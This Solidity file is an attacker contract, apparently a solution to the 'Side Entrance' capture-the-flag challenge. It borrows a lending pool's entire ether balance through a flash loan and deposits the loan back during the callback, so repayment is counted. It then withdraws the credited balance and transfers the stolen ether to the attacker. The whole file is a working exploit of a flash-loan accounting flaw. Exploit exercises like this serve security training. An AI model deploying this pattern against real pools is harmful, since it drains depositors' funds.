// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "solady/src/utils/SafeTransferLib.sol";
import "./SideEntranceLenderPool.sol";

contract SideEntranceAttacker {
    SideEntranceLenderPool public pool;
    address public attacker;

    modifier onlyAttacker() {
        if (msg.sender != attacker) {
            revert("Only attacker can call");
        }
        _;
    }

    constructor(address _pool) {
        pool = SideEntranceLenderPool(_pool);
        attacker = msg.sender;
    }

    function execute() external payable {
        pool.deposit{value: msg.value}();
    }

    function attack() external onlyAttacker {
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
        pool.withdraw();
        SafeTransferLib.safeTransferETH(attacker, poolBalance);
    }

    receive() external payable {}
}
